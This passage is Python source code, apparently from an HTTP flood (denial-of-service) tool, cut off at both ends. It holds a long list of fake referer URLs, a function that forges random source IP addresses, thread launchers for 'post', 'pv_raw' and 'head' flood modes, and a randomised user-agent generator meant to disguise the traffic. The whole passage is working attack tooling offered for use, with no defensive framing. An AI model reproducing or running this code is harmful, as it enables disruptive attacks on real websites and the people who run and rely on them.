"https://rangjued.com", "https://rank-checker.online", "https://rankings-analytics.com", "https://ranksonic.info", "https://ranksonic.net", "https://ranksonic.org", "https://rapidgator-porn.ga", "https://rapidsites.pro", "https://raschtextil.com.ua", "https://raymondblog.top", "https://razborka-skoda.org.ua", "https://rb-str.ru", "https://rcb101.ru", "https://realresultslist.com", "https://recinziireale.com", "https://rednise.com", "https://redraincine.com", "https://reginablog.top", "https://reginanahum.top", "https://regionshop.biz", "https://reklamnoe.agency", "https://releshop.ru", "https://remkompov.ru", "https://remont-kvartirspb.com", "https://remontvau.ru", "https://rent2spb.ru", "https://replica-watch.ru", "https://research.ifmo.ru", "https://resell-seo-services.com", "https://resellerclub.com", "https://responsive-test.net", "https://resurs-2012.ru", "https://reversing.cc", "https://revolgc.pro", "https://rfavon.ru", "https://rightenergysolutions.com.au", "https://roof-city.ru", "https://room-mebel.ru", "https://rospromtest.ru", "https://royal-casino.online", "https://royal-casino.ru", "https://royal-casinos.online", "https://royal-casinos.ru", "https://royal-cazino.online", "https://royal-cazino.ru", "https://rspectr.com", "https://ru-lk-rt.ru", "https://ru-onion.com", "https://ru-online-sberbank.ru", "https://ruinfocomp.ru", "https://rulate.ru", "https://rumamba.com", "https://rupolitshow.ru", "https://rus-lit.com", "https://rusexy.xyz", "https://ruspoety.ru", "https://russian-postindex.ru", "https://russian-translator.com", "https://russkie-sochineniya.ru", "https://rustag.ru", "https://rutor.group", "https://rxshop.md", "https://rybalka-opt.ru", "https://s-forum.biz", "https://s-luna.me", "https://sabinablog.xyz", "https://sad-torg.com.ua", "https://sady-urala.ru", "https://saltspray.ru", "https://samanthablog.online", "https://samara-airport.com", "https://samara-comfort.ru", "https://samchist.ru", "https://samlaurabrown.top", "https://samogonius.ru", "https://sanjosestartups.com", "https://santaren.by", "https://santasgift.ml", "https://santehnovich.ru", "https://sapaship.ru", "https://sauna-v-ufe.ru", "https://sauni-lipetsk.ru", "https://sauni-moskva.ru", "https://savetubevideo.com", "https://savetubevideo.info", "https://scansafe.net", "https://scat.porn", "https://screen-led.ru", "https://screentoolkit.com", "https://scripted.com", "https://search-error.com", "https://searchencrypt.com", "https://security-corporation.com.ua", "https://sel-hoz.com", "https://selfhotdog.com", "https://sell-fb-group-here.com", "https://semalt.com", "https://semaltmedia.com", "https://seo-2-0.com", "https://seo-platform.com", "https://seo-services-b2b.com", "https://seo-services-wordpress.com", "https://seo-smm.kz", "https://seo-tips.top", "https://seoanalyses.com", "https://seobook.top", "https://seocheckupx.com", "https://seocheckupx.net", "https://seoexperimenty.ru", "https://seojokes.net", "https://seopub.net", "https://seoservices2018.com", "https://serialsx.ru", "https://sex-porno.site", "https://sexpornotales.net", "https://sexreliz.com", "https://sexreliz.net", "https://sexsaoy.com", "https://sexuria.net", "https://sexyali.com", "https://shagtomsk.ru", "https://share-buttons-for-free.com", "https://share-buttons.xyz", "https://sharebutton.io", "https://sharebutton.net", "https://sharebutton.to", "https://sheki-spb.ru", "https://shnyagi.net", "https://shop2hydra.com", "https://shop4fit.ru", "https://shopfishing.com.ua", "https://shoppingmiracles.co.uk", "https://shoprybalka.ru", "https://shops-ru.ru", "https://shopsellcardsdumps.com", "https://shtaketniki.ru", "https://shulepov.ru", "https://sib-kukla.ru", "https://sibecoprom.ru", "https://sibkukla.ru", "https://sign-service.ru", "https://silvergull.ru", "https://sim-dealer.ru", "https://similarmoviesdb.com", "https://simoncinicancertherapy.com", "https://simple-share-buttons.com", "https://sinhronperevod.ru", "https://site-auditor.online", "https://site5.com", "https://siteripz.net", "https://sitesadd.com", "https://sitevaluation.org", "https://skidku.org.ua", "https://skinali.com", "https://skinali.photo-clip.ru", "https://sladkoevideo.com", "https://sledstvie-veli.net", "https://slftsdybbg.ru", "https://slkrm.ru", "https://slomm.ru", "https://slotron.com", "https://slow-website.xyz", "https://smailik.org", "https://smartphonediscount.info", "https://smt4.ru", "https://snabs.kz", "https://snaiper-bg.net", "https://sneakerfreaker.com", "https://snegozaderzhatel.ru", "https://snip.to", "https://snip.tw", "https://soaksoak.ru", "https://sochi-3d.ru", "https://social-button.xyz", "https://social-buttons-ii.xyz", "https://social-buttons.com", "https://social-traffic-1.xyz", "https://social-traffic-2.xyz", "https://social-traffic-3.xyz", "https://social-traffic-4.xyz", "https://social-traffic-5.xyz", "https://social-traffic-7.xyz", "https://social-widget.xyz", "https://socialbuttons.xyz", "https://socialseet.ru", "https://socialtrade.biz", "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", "https://sohoindia.net", "https://solitaire-game.ru", "https://solnplast.ru", "https://sosdepotdebilan.com", "https://souvenirua.com", "https://sovetogorod.ru", "https://sovetskie-plakaty.ru", "https://sowhoz.ru", "https://soyuzexpedition.ru", "https://sp-laptop.ru", "https://sp-zakupki.ru", "https://space2019.top", "https://spain-poetry.com", "https://spartania.com.ua", "https://spb-plitka.ru", "https://spb-scenar.ru", "https://specstroy36.ru", "https://speedup-my.site", "https://spin2016.cf", "https://sportobzori.ru", "https://sportwizard.ru", "https://spravka130.ru", "https://spravkavspb.net", "https://spravkavspb.work", "https://sprawka-help.com", "https://spy-app.info", "https://sqadia.com", "https://squarespace.top", "https://sribno.net", "https://sssexxx.net", "https://ssve.ru", "https://st-komf.ru", "https://sta-grand.ru", "https://stat.lviv.ua", "https://stavimdveri.ru", "https://steamcommunity.com/market/search?q=", "https://steame.ru", "https://stiralkovich.ru", "https://stocktwists.com", "https://stoletie.ru", "https://stoliar.org", "https://stomatologi.moscow", "https://stop-nark.ru", "https://stop-zavisimost.com", "https://store-rx.com", "https://strady.org.ua", "https://stream-tds.com", "https://stroi-24.ru", "https://stroy-matrix.ru", "https://stroyalp.ru", "https://stroyka-gid.ru", "https://stroyka47.ru", "https://studentguide.ru", "https://stuffhydra.com", "https://stylecaster.top", "https://su1ufa.ru", "https://success-seo.com", "https://sudachitravel.com", "https://sundrugstore.com", "https://super-seo-guru.com", "https://superiends.org", "https://supermama.top", "https://supermodni.com.ua", "https://superoboi.com.ua", "https://superslots-casino.online", "https://superslots-casino.site", "https://superslots-cazino.online", "https://superslots-cazino.site", "https://superslotz-casino.site", "https://superslotz-cazino.site", "https://supervesti.ru", "https://svadba-teplohod.ru", "https://svensk-poesi.com", "https://svet-depo.ru", "https://svetka.info", "https://svetoch.moscow", "https://svoimi-rukamy.com", "https://svs-avto.com", "https://swaplab.io", "https://sweet.tv", "https://t-machinery.ru", "https://t-rec.su", "https://taihouse.ru", "https://tam-gde-more.ru", "https://tamada69.com", "https://tammyblog.online", "https://targetpay.nl", "https://tattoo-stickers.ru", "https://tattooha.com", "https://tcenavoprosa.ru", "https://td-abs.ru", "https://td-l-market.ru", "https://td-perimetr.ru", "https://tdbatik.com", "https://tds-west.ru", "https://technika-remont.ru", "https://tedxrj.com", "https://telfer.ru", "https://teman.com.ua", "https://tennis-bet.ru", "https://tentcomplekt.ru", "https://teplohod-gnezdo.ru", "https://teplokomplex.ru", "https://teresablog.top", "https://tesla-audit.ru", "https://texnika.com.ua", "https://tgsubs.com", "https://tgtclick.com", "https://thaimassage-slon.ru", "https://thaoduoctoc.com", "https://the-world.ru", "https://theautoprofit.ml", "https://theguardlan.com", "https://thelotter.su", "https://thesensehousehotel.com", "https://thesmartsearch.net", "https://timmy.by", "https://tocan.biz", "https://tocan.com.ua", "https://tokshow.online", "https://tomck.com", "https://top-gan.ru", "https://top-instagram.info", "https://top-l2.com", "https://top1-seo-service.com", "https://top10-online-games.com", "https://top10-way.com", "https://topmebeltorg.ru", "https://toposvita.com", "https://topquality.cf", "https://topseoservices.co", "https://torobrand.com", "https://torospa.ru", "https://torrentgamer.net", "https://torrentred.games", "https://track-rankings.online", "https://tracker24-gps.ru", "https://trafers.com", "https://traffic-cash.xyz", "https://traffic2cash.org", "https://traffic2cash.xyz", "https://traffic2money.com", "https://trafficgenius.xyz", "https://trafficmonetize.org", "https://trafficmonetizer.org", "https://transit.in.ua", "https://traphouselatino.net", "https://travel-semantics.com", "https://trex.casino", "https://tricolortv-online.com", "https://trieste.io", "https://trion.od.ua", "https://truebeauty.cc", "https://tsatu.edu.ua", "https://tsc-koleso.ru", "https://tuningdom.ru", "https://tvfru.org", "https://twsufa.ru", "https://ua.tc", "https://uasb.ru", "https://ucanfly.ru", "https://ucoz.ru", "https://udav.net", "https://ufa.dienai.ru", "https://ufolabs.net", "https://uginekologa.com", "https://ukrainian-poetry.com", "https://ukrcargo.com", "https://ukrtvory.in.ua", "https://ul-potolki.ru", "https://undergroundcityphoto.com", "https://unibus.su", "https://univerfiles.com", "https://unlimitdocs.net", "https://unpredictable.ga", "https://uptime-as.net", "https://uptime-eu.net", "https://uptime-us.net", "https://uptime.com", "https://uptimechecker.com", "https://urblog.xyz", "https://uruto.ru", "https://uslugi-tatarstan.ru", "https://uyut-dom.pro", "https://uyutmaster73.ru", "https://uzpaket.com", "https://uzungil.com", "https://v-casino.fun", "https://v-casino.host", "https://v-casino.ru", "https://v-casino.site", "https://v-casino.website", "https://v-casino.xyz", "https://v-cazino.online", "https://v-cazino.ru", "https://vaderenergy.ru", "https://valid-cc.com", "https://validccseller.com", "https://validus.pro", "https://vape-x.ru", "https://vardenafil20.com", "https://varikozdok.ru", "https://vavada-cazino.site", "https://vbikse.com", "https://vchulkah.net", "https://veles.shop", "https://veloland.in.ua", "https://ventopt.by", "https://veronicablog.top", "https://vescenter.ru", "https://veselokloun.ru", "https://vesnatehno.com", "https://vetbvc.ru", "https://vezdevoz.com.ua", "https://vgoloveboli.net", "https://viagra-soft.ru", "https://video--production.com", "https://video-woman.com", "https://videochat.guru", "https://videochat.world", "https://videos-for-your-business.com", "https://videotop.biz", "https://viel.su", "https://viktoria-center.ru", "https://virtual-zaim.ru", "https://virtualbb.com", "https://virus-schutzmasken.de", "https://vk.com/profile.php?redirect=", "https://vkonche.com", "https://vksex.ru", "https://vladtime.ru", "https://vodabur.by", "https://vodaodessa.com", "https://vodkoved.ru", "https://volond.com", "https://vpdr.pl", "https://vrazbor59.ru", "https://vsdelke.ru", "https://vseigru.one", "https://vseigry.fun", "https://vseprobrak.ru", "https://vulkan-oficial.com", "https://vzheludke.com", "https://vzubah.com", "https://vzube.com", "https://vzubkah.com", "https://w2mobile-za.com", "https://w3javascript.com", "https://wakeupseoconsultant.com", "https://wallet-prlzn.space", "https://wallinside.top", "https://wallpaperdesk.info", "https://wallpapers-all.com", "https://warmex.com.ua", "https://wave-games.ru", "https://wayfcoin.space", "https://wdss.com.ua", "https://we-ping-for-youic.info", "https://web-analytics.date", "https://web-revenue.xyz", "https://webalex.pro", "https://weblibrary.win", "https://webmaster-traffic.com", "https://webmonetizer.net", "https://website-analytics.online", "https://website-analyzer.info", "https://website-speed-check.site", "https://website-speed-checker.site", "https://websitebottraffic.host", "https://websites-reviews.com", "https://websocial.me", "https://weburlopener.com", "https://weebly.com", "https://weightbelts.ru", "https://wfdesigngroup.com", "https://wmasterlead.com", "https://woman-orgasm.ru", "https://wordpress-crew.net", "https://wordpresscore.com", "https://workius.ru", "https://workona.com", "https://works.if.ua", "https://worldgamenews.com", "https://worldmed.info", "https://worldofbtc.com", "https://wpnull.org", "https://wrc-info.ru", "https://wufak.com", "https://ww2awards.info", "https://www-lk-rt.ru", "https://www.163.com", "https://www.1688.com", "https://www.1905.com", "https://www.2ch.net", "https://www.360.cn", "https://www.360.com", "https://www.39.net", "https://www.4399.com", "https://www.4dsply.com", "https://www.51.la", "https://www.51yes.com", "https://www.9gag.com", "https://www.about.com", "https://www.abs-cbn.com", "https://www.accuweather.com", "https://www.acfun.tv", "https://www.addthis.com", "https://www.adexc.net", "https://www.adf.ly", "https://www.adobe.com", "https://www.adplxmd.com", "https://www.airbnb.com", "https://www.albawabhnews.com", "https://www.alibaba.com", "https://www.aliexpress.com", "https://www.alipay.com", "https://www.allegro.pl", "https://www.amazon.ca", "https://www.amazon.cn", "https://www.amazon.co.jp", "https://www.amazon.co.uk", "https://www.amazon.com", "https://www.amazon.de", "https://www.amazon.es", "https://www.amazon.fr", "https://www.amazon.in", "https://www.amazon.it", "https://www.amazonaws.com", "https://www.ameblo.jp", "https://www.americanexpress.com", "https://www.ancestry.com", "https://www.aol.com", "https://www.apple.com", "https://www.archive.org", "https://www.ask.com", "https://www.ask.fm", "https://www.asos.com", "https://www.atlassian.net", "https://www.att.com", "https://www.avg.com", "https://www.avito.ru", "https://www.babytree.com", "https://www.badoo.com", "https://www.baidu.com", "https://www.bankofamerica.com", "https://www.battle.net", "https://www.bbc.co.uk", "https://www.bbc.com", "https://www.beeg.com", "https://www.behance.net", "https://www.bestbuy.com", "https://www.bet365.com", "https://www.bild.de", "https://www.bilibili.com", "https://www.billdesk.com", "https://www.bing.com", "https://www.bing.com/search?q=", "https://www.bitauto.com", "https://www.blastingnews.com", "https://www.blkget.com", "https://www.blog.jp", "https://www.blogger.com", "https://www.blogspot.com", "https://www.blogspot.com.br", "https://www.blogspot.in", "https://www.bloomberg.com", "https://www.bongacams.com", "https://www.booking.com", "https://www.box.com", "https://www.bp.blogspot.com", "https://www.bukalapak.com", "https://www.businessinsider.com", "https://www.buzzfeed.com", "https://www.buzzhand.com", "https://www.caijing.com.cn", "https://www.capitalone.com", "https://www.cctv.com", "https://www.chaoshi.tmall.com", "https://www.chase.com", "https://www.chaturbate.com", "https://www.china.com", "https://www.china.com.cn", "https://www.chinadaily.com.cn", "https://www.cia.gov/index.html", "https://www.citi.com", "https://www.clickadu.com", "https://www.cloudfront.net", "https://www.cnblogs.com", "https://www.cnet.com", "https://www.cnn.com", "https://www.cnnic.cn", "https://www.cntv.cn", "https://www.cnzz.com", "https://www.coccoc.com", "https://www.comcast.net", "https://www.conservativetribune.com", "https://www.craigslist.org", "https://www.csdn.net", "https://www.daikynguyenvn.com", "https://www.dailymail.co.uk", "https://www.dailymotion.com", "https://www.daum.net", "https://www.dell.com", "https://www.detail.tmall.com", "https://www.detik.com", "https://www.deviantart.com", "https://www.digikala.com", "https://www.diply.com", "https://www.directrev.com", "https://www.dmm.co.jp", "https://www.dmm.com", "https://www.doorblog.jp", "https://www.douban.com", "https://www.doubleclick.net", "https://www.doublepimp.com", "https://www.douyu.com", "https://www.dropbox.com", "https://www.eastday.com", "https://www.ebay-kleinanzeigen.de", "https://www.ebay.co.uk", "https://www.ebay.com", "https://www.ebay.de", "https://www.ebay.in", "https://www.ebay.it", "https://www.eksisozluk.com", "https://www.elpais.com", "https://www.enet.com.cn", "https://www.engadget.com", "https://www.espn.com", "https://www.espn.go.com", "https://www.espncricinfo.com", "https://www.etsy.com", "https://www.ettoday.net", "https://www.evernote.com", "https://www.exoclick.com", "https://www.expedia.com", "https://www.extratorrent.cc", "https://www.facebook.com", "https://www.facebook.com/", "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", "https://www.fbcdn.net", "https://www.fbi.com", "https://www.fbi.com/", "https://www.fc2.com", "https://www.fedex.com", "https://www.feedly.com", "https://www.fidelity.com", "https://www.files.wordpress.com", "https://www.flickr.com", "https://www.flipkart.com", "https://www.forbes.com", "https://www.force.com", "https://www.foxnews.com", "https://www.freepik.com", "https://www.friv.com", "https://www.gamer.com.tw", "https://www.gamersky.com", "https://www.gearbest.com", "https://www.gfycat.com", "https://www.giphy.com", "https://www.github.com", "https://www.github.io", "https://www.gizmodo.com", "https://www.globaloffers.link", "https://www.globo.com", "https://www.gmw.cn", "https://www.gmx.net", "https://www.go.com", "https://www.goal.com", "https://www.godaddy.com", "https://www.goo.ne.jp", "https://www.goodreads.com", "https://www.google.ad/search?q=", "https://www.google.ae", "https://www.google.ae/search?q=", "https://www.google.al/search?q=", "https://www.google.am/search?q=", "https://www.google.at", "https://www.google.az", "https://www.google.be", "https://www.google.ca", "https://www.google.ch", "https://www.google.cl", "https://www.google.cn", "https://www.google.co.ao/search?q=", "https://www.google.co.id", "https://www.google.co.il", "https://www.google.co.in", "https://www.google.co.jp", "https://www.google.co.kr", "https://www.google.co.th", "https://www.google.co.uk", "https://www.google.co.ve", "https://www.google.co.za", "https://www.google.com", "https://www.google.com.af/search?q=", "https://www.google.com.ag/search?q=", "https://www.google.com.ai/search?q=", "https://www.google.com.ar", "https://www.google.com.au", "https://www.google.com.bd", "https://www.google.com.br", "https://www.google.com.co", "https://www.google.com.eg", "https://www.google.com.hk", "https://www.google.com.mx", "https://www.google.com.ng", "https://www.google.com.pe", "https://www.google.com.ph", "https://www.google.com.pk", "https://www.google.com.sa", "https://www.google.com.sg", "https://www.google.com.tr", "https://www.google.com.tw", "https://www.google.com.ua", "https://www.google.com.vn", "https://www.google.com/search?q=", "https://www.google.cz", "https://www.google.de", "https://www.google.dk", "https://www.google.dz", "https://www.google.es", "https://www.google.fi", "https://www.google.fr", "https://www.google.gr", "https://www.google.hu", "https://www.google.ie", "https://www.google.it", "https://www.google.nl", "https://www.google.no", "https://www.google.pl", "https://www.google.pt", "https://www.google.ro", "https://www.google.ru", "https://www.google.se", "https://www.google.sk", "https://www.googleusercontent.com", "https://www.groupon.com", "https://www.gsmarena.com", "https://www.haber7.com", "https://www.hao123.com", "https://www.haosou.com", "https://www.hatenablog.com", "https://www.hclips.com", "https://www.hdfcbank.com", "https://www.homedepot.com", "https://www.hotstar.com", "https://www.hp.com", "https://www.huanqiu.com", "https://www.huffingtonpost.com", "https://www.hulu.com", "https://www.hurriyet.com.tr", "https://www.icicibank.com", "https://www.icloud.com", "https://www.ifeng.com", "https://www.ign.com", "https://www.ikea.com", "https://www.imdb.com", "https://www.imgur.com", "https://www.incometaxindiaefiling.gov.in", "https://www.indeed.com", "https://www.independent.co.uk", "https://www.indiatimes.com", "https://www.instagram.com", "https://www.intuit.com", "https://www.iqiyi.com", "https://www.irctc.co.in", "https://www.isanalyze.com", "https://www.jd.com", "https://www.kakaku.com", "https://www.kapanlagi.com", "https://www.kaskus.co.id", "https://www.kickstarter.com", "https://www.kinogo.club", "https://www.kinopoisk.ru", "https://www.kissanime.to", "https://www.kohls.com", "https://www.kompas.com", "https://www.le.com", "https://www.leboncoin.fr", "https://www.lifehacker.com", "https://www.linkedin.com", "https://www.liputan6.com", "https://www.list-manage.com", "https://www.list.tmall.com", "https://www.live.com", "https://www.livedoor.biz", "https://www.livedoor.com", "https://www.livedoor.jp", "https://www.livejasmin.com", "https://www.livejournal.com", "https://www.loading-delivery2.com", "https://www.lowes.com", "https://www.ltn.com.tw", "https://www.macys.com", "https://www.mail.ru", "https://www.mailchimp.com", "https://www.mama.cn", "https://www.marca.com", "https://www.mashable.com", "https://www.media.tumblr.com", "https://www.mediafire.com", "https://www.medium.com", "https://www.mega.nz", "https://www.mercadolivre.com.br", "https://www.merdeka.com", "https://www.messenger.com", "https://www.mi.com", "https://www.microsoft.com", "https://www.microsoftonline.com", "https://www.milliyet.com.tr", "https://www.mlb.com", "https://www.mozilla.org", "https://www.msn.com", "https://www.myway.com", "https://www.nametests.com", "https://www.naukri.com", "https://www.naver.com", "https://www.naver.jp", "https://www.nbcnews.com", "https://www.nbcolympics.com", "https://www.ndtv.com", "https://www.netflix.com", "https://www.nhk.or.jp", "https://www.nicovideo.jp", "https://www.nih.gov", "https://www.nordstrom.com", "https://www.nownews.com", "https://www.nyaa.se", "https://www.nytimes.com", "https://www.office.com", "https://www.ok.ru", "https://www.olx.pl", "https://www.onedio.com", "https://www.onet.pl", "https://www.onlinesbi.com", "https://www.openload.co", "https://www.oracle.com", "https://www.orange.fr", "https://www.ouo.io", "https://www.outbrain.com", "https://www.ozock.com", "https://www.panda.tv", "https://www.pandora.com", "https://www.paypal.com", "https://www.paytm.com", "https://www.pinimg.com", "https://www.pinterest.com", "https://www.pixiv.net", "https://www.pixnet.net", "https://www.pokevision.com", "https://www.popads.net", "https://www.popcash.net", "https://www.prjcq.com", "https://www.ps4ux.com", "https://www.putlocker.is", "https://www.qq.com", "https://www.quora.com", "https://www.qwant.com/search?q=", "https://www.rakuten.co.jp", "https://www.rambler.ru", "https://www.rarbg.to", "https://www.reddit.com", "https://www.reddituploads.com", "https://www.redtube.com", "https://www.reimageplus.com", "https://www.repubblica.it", "https://www.reuters.com", "https://www.rio2016.com", "https://www.roblox.com", "https://www.rt.com", "https://www.rutracker.org", "https://www.sabah.com.tr", "https://www.sahibinden.com", "https://www.salesforce.com", "https://www.samsung.com", "https://www.savefrom.net", "https://www.sberbank.ru", "https://www.scribd.com", "https://www.scribol.com", "https://www.secureserver.net", "https://www.seznam.cz", "https://www.sh.st", "https://www.sharepoint.com", "https://www.shopify.com", "https://www.shutterstock.com", "https://www.sina.com.cn", "https://www.siteadvisor.com", "https://www.skype.com", "https://www.slack.com", "https://www.slickdeals.net", "https://www.slideshare.net", "https://www.snapdeal.com", "https://www.so.com", "https://www.softonic.com", "https://www.sogou.com", "https://www.sohu.com", "https://www.soso.com", "https://www.soundcloud.com", "https://www.sourceforge.net", "https://www.speedtest.net", "https://www.spiegel.de", "https://www.spotify.com", "https://www.stackexchange.com", "https://www.stackoverflow.com", "https://www.steamcommunity.com", "https://www.steampowered.com", "https://www.suning.com", "https://www.t-online.de", "https://www.t.co", "https://www.taboola.com", "https://www.taleo.net", "https://www.taobao.com", "https://www.target.com", "https://www.taringa.net", "https://www.ted.com/search?q=", "https://www.telegram.org", "https://www.telegraph.co.uk", "https://www.terraclicks.com", "https://www.theguardian.com", "https://www.theladbible.com", "https://www.themeforest.net", "https://www.thepiratebay.org", "https://www.thesaurus.com", "https://www.thewhizmarketing.com", "https://www.tianya.cn", "https://www.tistory.com", "https://www.tmall.com", "https://www.tokopedia.com", "https://www.torrentz.eu", "https://www.trello.com", "https://www.tribunnews.com", "https://www.tripadvisor.com", "https://www.tube8.com", "https://www.tuberel.com", "https://www.tudou.com", "https://www.tumblr.com", "https://www.twimg.com", "https://www.twitch.tv", "https://www.twitter.com", "https://www.txxx.com", "https://www.uol.com.br", "https://www.uploaded.net", "https://www.ups.com", "https://www.uptodown.com", "https://www.urdupoint.com", "https://www.usaa.com", "https://www.usatoday.com", "https://www.usatoday.com/search/results?q=", "https://www.usps.com", "https://www.varzesh3.com", "https://www.verizonwireless.com", "https://www.vice.com", "https://www.videomega.tv", "https://www.vimeo.com", "https://www.viralthread.com", "https://www.vk.com", "https://www.w3schools.com", "https://www.walmart.com", "https://www.washingtonpost.com", "https://www.weather.com", "https://www.web.de", "https://www.webmd.com", "https://www.webtretho.com", "https://www.weebly.com", "https://www.weibo.com", "https://www.wellsfargo.com", "https://www.wetransfer.com", "https://www.whatsapp.com", "https://www.wikia.com", "https://www.wikihow.com", "https://www.wikimedia.org", "https://www.wikipedia.org", "https://www.wix.com", "https://www.wordpress.com", "https://www.wordpress.org", "https://www.wordreference.com", "https://www.wp.pl", "https://www.wsj.com", "https://www.wwwpromoter.com", "https://www.xda-developers.com", "https://www.xfinity.com", "https://www.xhamster.com", "https://www.xinhuanet.com", "https://www.xnxx.com", "https://www.xywy.com", "https://www.yahoo.co.jp", "https://www.yahoo.com", "https://www.yandex.ru", "https://www.yelp.com", "https://www.yesky.com", "https://www.youku.com", "https://www.youm7.com", "https://www.youth.cn", "https://www.youtube-mp3.org", "https://www.youtube.com", "https://www.youtube.com/", "https://www.zendesk.com", "https://www.zhihu.com", "https://www.zillow.com", "https://www.zippyshare.com", "https://www.zoho.com", "https://www.zol.com.cn", "https://x-lime.com", "https://x-lime.net", "https://x5market.ru", "https://xaker26.net", "https://xexe.club", "https://xkaz.org", "https://xn-------53dbcapga5atlplfdm6ag1ab1bvehl0b7toa0k.xn--p1ai", "https://xn------6cdbciescapvf0a8bibwx0a1bu.xn--90ais", "https://xn-----6kcamwewcd9bayelq.xn--p1ai", "https://xn-----7kcaaxchbbmgncr7chzy0k0hk.xn--p1ai", "https://xn-----clckdac3bsfgdft3aebjp5etek.xn--p1ai", "https://xn----7sbabb9a1b7bddgm6a1i.xn--p1ai", "https://xn----7sbabhjc3ccc5aggbzfmfi.xn--p1ai", "https://xn----7sbabhv4abd8aih6bb7k.xn--p1ai", "https://xn----7sbabm1ahc4b2aqff.su", "https://xn----7sbabn5abjehfwi8bj.xn--p1ai", "https://xn----7sbbpe3afguye.xn--p1ai", "https://xn----7sbho2agebbhlivy.xn--p1ai", "https://xn----8sbaki4azawu5b.xn--p1ai", "https://xn----8sbarihbihxpxqgaf0g1e.xn--80adxhks", "https://xn----8sbbjimdeyfsi.xn--p1ai", "https://xn----8sbhefaln6acifdaon5c6f4axh.xn--p1ai", "https://xn----8sblgmbj1a1bk8l.xn----161-4vemb6cjl7anbaea3afninj.xn--p1ai", "https://xn----8sbowe2akbcd4h.xn--p1ai", "https://xn----8sbpmgeilbd8achi0c.xn--p1ai", "https://xn----btbdvdh4aafrfciljm6k.xn--p1ai", "https://xn----ctbbcjd3dbsehgi.xn--p1ai", "https://xn----ctbfcdjl8baejhfb1oh.xn--p1ai", "https://xn----ctbigni3aj4h.xn--p1ai", "https://xn----dtbffp5aagjgfm.xn--p1ai", "https://xn----ftbeoaiyg1ak1cb7d.xn--p1ai", "https://xn----itbbudqejbfpg3l.com", "https://xn----jtbjfcbdfr0afji4m.xn--p1ai", "https://xn--78-6kcmzqfpcb1amd1q.xn--p1ai", "https://xn--80aaajkrncdlqdh6ane8t.xn--p1ai", "https://xn--80aabcsc3bqirlt.xn--p1ai", "https://xn--80aanaardaperhcem4a6i.com", "https://xn--80adaggc5bdhlfamsfdij4p7b.xn--p1ai", "https://xn--80adgcaax6acohn6r.xn--p1ai", "https://xn--80aeb6argv.xn--p1ai", "https://xn--80ahdheogk5l.xn--p1ai", "https://xn--90acenikpebbdd4f6d.xn--p1ai", "https://xn--90acjmaltae3acm.xn--p1acf", "https://xn--c1acygb.xn--p1ai", "https://xn--d1abj0abs9d.in.ua", "https://xn--d1aifoe0a9a.top", "https://xn--e1aaajzchnkg.ru.com", "https://xn--e1aahcgdjkg4aeje6j.kz", "https://xn--e1agf4c.xn--80adxhks", "https://xpert.com.ua", "https://xrp-ripple.info", "https://xtraffic.plus", "https://xtrafficplus.com", "https://xxxhamster.me", "https://xz618.com", "https://yaderenergy.ru", "https://yes-com.com", "https://yes-do-now.com", "https://yhirurga.ru", "https://ykecwqlixx.ru", "https://yodse.io", "https://yoga4.ru", "https://yougame.biz", "https://youhack.info", "https://youporn-forum.ga", "https://youporn-ru.com", "https://your-good-links.com", "https://your-tales.ru", "https://yourserverisdown.com", "https://yur-p.ru", "https://yurcons.pro", "https://yuristproffi.ru", "https://zagadki.in.ua", "https://zahodi2hydra.net", "https://zahvat.ru", "https://zakaznoy.com.ua", "https://zakis-azota24.ru", "https://zakisazota-official.com", "https://zamolotkom.ru", "https://zapnado.ru", "https://zarabotat-v-internete.biz", "https://zastroyka.org", "https://zavod-gm.ru", "https://zdm-auto.com", "https://zdm-auto.ru", "https://zdorovie-nogi.info", "https://zelena-mriya.com.ua", "https://zhcsapp.net", "https://zhoobintravel.com", "https://zonefiles.bid", "https://zot.moscow", "https://zt-m.ru", "https://zvetki.ru", "https://zvooq.eu", "https://zvuker.net",]

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

ind_dict = {}
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
###################################################
Intn = random.randint
Choice = random.choice
###################################################
def build_threads(mode,thread_num,event,socks_type,ind_rlock):
  try:
    if mode == "post":
      for _ in range(thread_num):
        th = threading.Thread(target = post,args=(event,socks_type,ind_rlock,))
        th.setDaemon(True)
        th.start()
    elif mode == "pv_raw":
      for _ in range(thread_num):
        th = threading.Thread(target = pv_raw,args=(event,socks_type,ind_rlock,))
        th.setDaemon(True)
        th.start()
    elif mode == "head":
      for _ in range(thread_num):
        th = threading.Thread(target = head,args=(event,socks_type,ind_rlock,))
        th.setDaemon(True)
        th.start()
  except OSError:
    print('threading error occured - lower the threads! your system cant handle this amount')
    subprocess.run('pkill -9 -f pvraw2.py', shell=True)
    print('killed')
    sys.exit()
  except UnboundLocalError:
    
    print('threading error occured - lower the threads! your system cant handle this amount')
    subprocess.run('pkill -9 -f pvraw2.py', shell=True)
    print('killed')
    sys.exit()
  except RuntimeError:
    
    print('threading error occured - lower the threads! your system cant handle this amount')
    subprocess.run('pkill -9 -f pvraw2.py', shell=True)
    print('killed')
    sys.exit()

def getuseragent():
  platform = Choice(['Macintosh', 'Windows', 'X11'])
  if platform == 'Macintosh':
    os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])
  elif platform == 'Windows':
    os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
  elif platform == 'X11':
    os  = Choice(['Linux i686', 'Linux x86_64'])
  browser = Choice(['chrome', 'firefox', 'ie'])
  if browser == 'chrome':
    webkit = str(Intn(500, 599))
    version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
    return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
  elif browser == 'firefox':
    currentYear = datetime.date.today().year
    year = str(Intn(2020, currentYear))
    month = Intn(1, 12)
    if month < 10:
